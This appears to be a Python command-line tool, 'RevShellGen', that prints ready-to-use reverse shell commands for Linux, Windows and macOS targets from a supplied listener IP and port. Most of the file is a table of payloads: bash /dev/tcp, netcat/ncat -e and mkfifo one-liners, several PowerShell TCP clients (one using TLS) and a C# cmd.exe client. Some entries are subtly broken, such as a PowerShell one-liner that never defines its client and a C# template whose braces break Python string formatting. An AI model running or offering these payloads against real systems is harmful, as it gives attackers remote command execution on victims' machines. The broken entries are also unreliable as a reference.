import os
import pyfiglet
import typer

# Term colors
class bcolors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Define the reverse shell examples
reverse_shells = {
    'linux': {
        'bash -i': 'bash -i >& /dev/tcp/{}/{} 0>&1',
        'sh -i': 'bash -i >& /dev/tcp/{}/{} 0>&1',
        'bash 196': '0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196',
        'bash read line': 'exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do $line 2>&5 >&5; done',
        'bash 5': 'bash -i 5<> /dev/tcp/{}/{} 0<&5 1>&5 2>&5',
        'bash udp': 'sh -i >& /dev/udp/{}/{} 0>&1',
        'nc mkfifo': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f',
        'nc -e': 'nc -e /bin/sh {0} {1}',
        'nc -c': 'nc -c /bin/sh {0} {1}',
        'ncat -e': 'ncat {0} {1} -e /bin/sh',
    },
    'windows': {
        'nc.exe -e': 'nc.exe -e cmd.exe {} {}',
        'ncat.exe -e': 'ncat.exe -e cmd.exe {} {}',
        'PowerShell #1': 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{0}",{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}; $client.Close()',
        'PowerShell #2': 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{0}\',{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',
        'PowerShell #3': 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{0}\',{1});$stream = $client.GetStream();$writer = new-object System.IO.StreamWriter($stream);$buffer = new-object System.Byte[] 1024;$encoding = new-object System.Text.AsciiEncoding;$writer.Write([System.Text.Encoding]::ASCII.GetBytes((Get-Location).Path + \'> \'));$writer.Flush();while(($i = $stream.Read($buffer, 0, 1024)) -ne 0){{; $data = $encoding.GetString($buffer,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $writer.Write([System.Text.Encoding]::ASCII.GetBytes($sendback)); $writer.Write([System.Text.Encoding]::ASCII.GetBytes((Get-Location).Path + \'> \')); $writer.Flush()}}; $client.Close()"',
        'PowerShell #4 (TLS)': 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{0}\',{1});$stream = $client.GetStream();$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$sslStream.AuthenticateAsClient(\'localhost\');$writer = new-object System.IO.StreamWriter($sslStream);$buffer = new-object System.Byte[] 1024;$encoding = new-object System.Text.AsciiEncoding;$writer.Write([System.Text.Encoding]::ASCII.GetBytes((Get-Location).Path + \'> \'));$writer.Flush();while(($i = $sslStream.Read($buffer, 0, 1024)) -ne 0){{; $data = $encoding.GetString($buffer,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $writer.Write([System.Text.Encoding]::ASCII.GetBytes($sendback)); $writer.Write([System.Text.Encoding]::ASCII.GetBytes((Get-Location).Path + \'> \')); $writer.Flush()}}; $client.Close()"',
        'C# Bash -i': '''using System;using System.Diagnostics;using System.Net.Sockets;using System.Text;class Program{static void Main(string[] args){using(TcpClient client = new TcpClient("{0}", {1})){using(NetworkStream stream = client.GetStream()){using(StreamReader reader = new StreamReader(stream, Encoding.ASCII)){using(StreamWriter writer = new StreamWriter(stream, Encoding.ASCII)){writer.AutoFlush = true;string inputLine;Process process = new Process();process.StartInfo.FileName = "cmd.exe";process.StartInfo.UseShellExecute = false;process.StartInfo.RedirectStandardOutput = true;process.StartInfo.RedirectStandardInput = true;process.Start();while ((inputLine = reader.ReadLine()) != null){process.StandardInput.WriteLine(inputLine);}}}}}}}}''',
    },
    'macos': {
        'bash -i': 'bash -i >& /dev/tcp/{}/{} 0>&1',
        'sh -i': 'bash -i >& /dev/tcp/{}/{} 0>&1',
        'bash 196': '0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196',
        'bash read line': 'exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do $line 2>&5 >&5; done',
        'bash 5': 'bash -i 5<> /dev/tcp/{}/{} 0<&5 1>&5 2>&5',
        'nc mkfifo': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f',
        'nc -e': 'nc -e /bin/sh {0} {1}',
        'nc -c': 'nc -c /bin/sh {0} {1}',
        'ncat -e': 'ncat {0} {1} -e /bin/sh',
    }
}

def list_reverse_shells(os_category: str):
    """List available reverse shells for a given OS category."""
    os_category = os_category.lower()
    if os_category in reverse_shells:
        typer.echo(f"Available reverse shell types for {os_category.capitalize()}:")
        for key in reverse_shells[os_category]:
            typer.echo(f"- {key}")
    else:
        typer.echo(f"No reverse shells available for OS category: {os_category}")

def generate_reverse_shells(ip: str, port: int, os_category: str, shell_type: str):
    """Generate reverse shell commands based on provided arguments."""
    os_category = os_category.lower()
    if os_category in reverse_shells and shell_type in reverse_shells[os_category]:
        command = reverse_shells[os_category][shell_type]
        typer.secho(f"IP Address: {ip}", fg=typer.colors.GREEN, bold=True)
        typer.secho(f"Port: {port}", fg=typer.colors.GREEN, bold=True)
        typer.secho(f"Target Operating System: {os_category.capitalize()}", fg=typer.colors.GREEN, bold=True)
        typer.secho(f"Reverse Shell Type: {shell_type}", fg=typer.colors.GREEN, bold=True)
        typer.echo(f"{bcolors.WARNING}Command: {command.format(ip, port)}{bcolors.ENDC}")
    else:
        typer.echo(f"No matching reverse shell type for OS category '{os_category}' and shell type '{shell_type}'")

def main(ip: str = typer.Option(..., help="IP address of the listener."),
         port: int = typer.Option(..., help="Port number of the listener."),
         os_category: str = typer.Option("linux", help="Operating system of the target. Default is 'linux'."),
         list_shells: bool = typer.Option(False, help="List all available shells for the target OS."),
         shell_type: str = typer.Option(None, help="Specific reverse shell type to generate.")):
    """Generate Reverse Shell Commands based on Target OS."""
    print(pyfiglet.figlet_format("RevShellGen", font="slant"))
    
    if list_shells:
        list_reverse_shells(os_category)
    else:
        if shell_type:
            generate_reverse_shells(ip, port, os_category, shell_type)
        else:
            typer.echo("Please specify a reverse shell type using --shell-type or list available shells using --list-shells.")

if __name__ == "__main__":
    typer.run(main)
